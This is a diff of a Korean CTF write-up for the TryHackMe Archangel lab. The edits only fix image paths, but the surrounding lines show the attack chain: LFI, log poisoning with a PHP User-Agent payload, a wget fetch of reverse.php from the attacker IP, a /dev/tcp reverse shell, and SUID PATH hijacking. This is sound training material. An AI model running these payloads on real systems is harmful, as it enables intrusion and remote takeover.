@@ -50,7 +50,7 @@ Nmap done: 1 IP address (1 host up) scanned in 77.49 seconds
 - SSH의 경우 Username 열거에 관한 취약점 제외 유의미한 취약점은 없는듯 함.
 - 80번 포트로 HTTP 웹 서비스가 서비스 동작중이므로, 해당 서비스를 중심으로 공격 방향을 잡음
 
-![그림1-1](/assets/image/write-up/thm_archangel//image.png)
+![그림1-1](/assets/image/write-up/thm/thm_archangel//image.png)
 - 해당 주소 접속시 아무런 동작을 수행하지 않는 사이트가 존재함.
 - 소스코드에서 유의미한 정보가 노출되어있지 않음
 ### Gobuster 을 통한 디렉터리 부르트포싱
@@ -95,7 +95,7 @@ Finished
 - 유의미한 디렉터리 및 파일은 발견되지 않았음, 
 - 공격 대상 IP에 대해 가상 호스트 사용 가능성을 두고 웹 사이트 내 도메인을 찾아봄
 - 해당 웹 사이트 우측 상단에 관리자의 이메일이 존재하였으며, 해당 도메인을 /etc/hosts에 타겟 시스템IP와 매칭시켜 접속을 시도해봄
-![그림1-2](/assets/image/write-up/thm_archangel/image2.png)
+![그림1-2](/assets/image/write-up/thm/thm_archangel/image2.png)
 - 플래그를 획득 할 수 있었음
 ### 추가 획득한 도메인에 대한 2차 디렉터리 부르트 포싱
 
@@ -138,7 +138,7 @@ Starting gobuster in directory enumeration mode
 
 ## 취약점 분석
 ### test.php 경로 발견
-![그림1-3](/assets/image/write-up/thm_archangel/image3.png)
+![그림1-3](/assets/image/write-up/thm/thm_archangel/image3.png)
 - URI 확인시 view 파라미터를 통해 특정 경로의 파일을 include하고 있음.
 - 이를 통해 LFI 취약점이 존재할 것이라고 판단함.
 - 개념증명을 위해 ../../../../etc/passwd 경로로 접근을 시도하였으나, 허용되지 않음
@@ -189,21 +189,21 @@ echo 'CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aX
 ## 내부침투
 ### Log Poisoning 취약점 공격
 
-![그림1-4](/assets/image/write-up/thm_archangel/image4.png)
+![그림1-4](/assets/image/write-up/thm/thm_archangel/image4.png)
 - access.log 파일에 성공적으로 접근할 수 있었으며
 - 해당 파일에는 클라이언트의 User-Agent 정보가 기록된다.
 - 이 때 User-Agent 값에 악의적인 코드(PHP 시스템 명령어)를 삽입하게 되면, 서버측에서는 User-Agent 헤더를 해석하며 PHP 소스코드를 만나게되고, 이를 PHP 코드로 인식하여 실행하게 된다.
-![그림 1-5](/assets/image/write-up/thm_archangel/image5.png)
+![그림 1-5](/assets/image/write-up/thm/thm_archangel/image5.png)
 - 간단하게 echo 를 사용하여 정상적으로 실행되는지 확인 한 결과 악의적인 코드삽입으로 인한 String이 로그파일에 출력되는 걸 알 수 있다.
 
-![그림 1-6](/assets/image/write-up/thm_archangel/image6.png)
+![그림 1-6](/assets/image/write-up/thm/thm_archangel/image6.png)
 - Reverse shell 코드가 작성되어 있는 PHP 파일을 생성 후 공격자 PC에서 웹 서버를 구동시켜 User-Agent 헤더를 통해 해당 파일을 가져올 수 있도록 했다.
 
 ```
 GET /test.php?view=/var/www/html/development_testing/.././.././.././.././.././var/log/apache2/access.log&cmd=wget+http://10.4.47.45/reverse.php 
 ```
 
-![그림 1-7](/assets/image/write-up/thm_archangel/image7.png)
+![그림 1-7](/assets/image/write-up/thm/thm_archangel/image7.png)
 
 - 성공적으로 악성 코드를 받을 수 있었다.
 
@@ -214,7 +214,7 @@ GET /test.php?view=/var/www/html/development_testing/.././.././.././.././.././va
 User-Agent: <?php system($_GET['cmd']);?>
 ```
 
-![그림 1-8](/assets/image/write-up/thm_archangel/image8.png)
+![그림 1-8](/assets/image/write-up/thm/thm_archangel/image8.png)
 - 성공적으로 웹 서버의 쉘을 획득했다.
 
 ## 시스템 권한 상승
@@ -290,7 +290,7 @@ echo "hello world" >> /opt/backupfiles/helloworld.txt
 sh -i >& /dev/tcp/10.4.47.45/5252 0>&1
 ```
 
-![그림 1-9](/assets/image/write-up/thm_archangel/image9.png)
+![그림 1-9](/assets/image/write-up/thm/thm_archangel/image9.png)
 - 성공적으로 archange 사용자의 권한을 획득했다.
 
 ```
@@ -316,7 +316,7 @@ archangel@ubuntu:~/secret$ ls -l
 
 - SHELL 을 실행시키는 임의의 파일을 생성 후 파일 명을 CP로 생성한 후 $PATH 경로를 조작하면
 - SUID가 설정되어 있는 backup 파일을 실행시킬 경우 파일 소유자인 root 권한으로 실행되며, root 쉘이 획득된다.
-![그림 1-10](/assets/image/write-up/thm_archangel/image10.png)
+![그림 1-10](/assets/image/write-up/thm/thm_archangel/image10.png)
 
 - cp 명령어 사용시 참조하는 절대 경로를 조작하여,
 ./backup 파일 실행시 cp 명령어가 실행되며, 공격자가 임의 생성한 cp 파일을 실행하여 관리자 권한인 root 권한을 획득할 수 있다.
